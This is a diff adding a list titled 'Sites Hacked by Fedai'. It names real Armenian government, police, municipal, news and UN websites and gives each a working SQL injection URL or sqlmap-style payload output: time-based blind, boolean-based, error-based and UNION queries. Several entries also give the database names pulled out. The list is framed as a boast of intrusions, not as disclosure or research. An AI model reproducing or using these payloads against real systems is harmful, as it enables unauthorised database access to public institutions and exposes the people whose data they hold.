@@ -1,0 +1,80 @@
+List of Sites Hacked by "Fedai"
+
+
+
+The official website of the police of the Republic of Armenia.
+https://www.police.am
+https://www.police.am/en/international-co-operation/history-of-cooperation/
+Parameter: #1* (URI)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: https://www.police.am:443/en/international-co-operation/history-of-cooperation/' AND (SELECT 6202 FROM (SELECT(SLEEP(5)))QFfG) AND 'ZVnn'='ZVnn
+Database name = studioo6_police
+
+Corruption Prevention Commission of the Armenia
+http://cpcarmenia.am/
+http://cpcarmenia.am/hy/search/?adv_qry=&cat_sel0=&cat_sel1=&cat_sel2=&cat_sel3=&cat_sel4=&category=0&catid=0&db=0&domain=0&mark=markblue&media_only=0&prefix=1%27%22&query_t=*1*&results=10&search=1&smt_button=text&start=3&type=and&up_advanced=0
+
+Official website of the Municipality of Yerevan
+https://www.yerevan.am/
+https://www.yerevan.am/ru/guyq-hogh/  Post_data= "b_type=1&district=1&guyq_id=-1%20OR%203*2*1=6%20AND%20000817=000817&street=3137%20Laguna%20Street&stype=1"
+Database name = yerevanam
+
+ArmInfo- News on Armenia and "Qarabağ"
+https://arminfo.info/
+https://arminfo.info/index.cfm?objectid=5E2105E0-7266-11E3-80CE0EB7C0D21663'%20AND%203*2*1=6%20AND%20'000ceNS'='000ceNS
+Parameter: objectid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: objectid=5E2105E0-7266-11E3-80CE0EB7C0D21663' AND 3*2*1=6 AND '000ceNS'='000ceNS' AND 4763=4763 AND 'VgsF'='VgsF
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+    Payload: objectid=5E2105E0-7266-11E3-80CE0EB7C0D21663' AND 3*2*1=6 AND '000ceNS'='000ceNS' AND SLEEP(5) AND 'Liqx'='Liqx
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 27 columns
+    Payload: objectid=-8297' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a7a6a71,0x564351686f795661785045465266634f47484143484451536c6861776c666c4e6c6371696b6a5252,0x716b716271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+Database name = finport_arminfodb
+
+
+"SPYUR" INFORMATION SYSTEM • ARMENIA 
+https://www.spyur.am/
+https://www.spyur.am/en/home/advanced_search/?from=by_home&products_and_services=1&search=1&yp_cat3=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/
+
+
+
+Products from Armenia - Armenia Online
+http://www.armeniaonline.ru
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: http://www.armeniaonline.ru:80//catalog.php/-3834 OR NOT 5941=5941#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: http://www.armeniaonline.ru:80//catalog.php/-3834 AND GTID_SUBSET(CONCAT(0x717a716271,(SELECT (ELT(5253=5253,1))),0x7171707671),5253)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: http://www.armeniaonline.ru:80//catalog.php/-3834 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: http://www.armeniaonline.ru:80//catalog.php/-3834 UNION ALL SELECT CONCAT(0x717a716271,0x51495a516c715656514a4379465869626b56704c42716f47797376465a4e467a6d506c5662654544,0x7171707671)-- -
+Database names = u70431 , u70431_bitrix , u70431_ss , u70431_wa
+
+News-ARMENIA Today
+http://www.armtoday.info/
+http://www.armtoday.info/default.asp?Date=07/16/2020&Dir=-1&From=148793%20AND%203*2*1=6%20AND%20952=952&Lang=_Ru&PagePosition=2&RegionID=0&SectionID=0
+Database name = u493237
+
+
+Armenian News
+https://www.7or.am/
+https://www.7or.am/ru/news/view/-1%20OR%203*2*1=6%20AND%20000810=000810/
+
+
+UN in Armenia
+http://www.un.am/
+http://www.un.am/en/en/virtual-library?filter[agency]=IOM'%20AND%203*2*1=6%20AND%20'000bDWX'='000bDWX
